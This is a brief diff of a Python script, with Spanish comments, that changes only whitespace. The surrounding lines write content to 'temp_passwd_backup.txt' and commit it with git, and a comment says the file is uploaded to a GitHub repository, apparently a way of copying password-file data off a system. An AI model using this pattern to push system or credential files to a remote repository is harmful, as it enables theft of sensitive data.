@@ -24,7 +24,7 @@ def run():
     # Guarda el contenido en un archivo temporal
     with open('temp_passwd_backup.txt', 'w') as temp_file:
         temp_file.write(contenido)
-
+        
     # Añade y sube el archivo al repositorio de GitHub
     subprocess.run(['git', 'add', 'temp_passwd_backup.txt'])
     subprocess.run(['git', 'commit', '-m', mensaje_commit])
@@ -42,4 +42,3 @@ def run():
 
 # Llamamos a la función run()
 run()
-
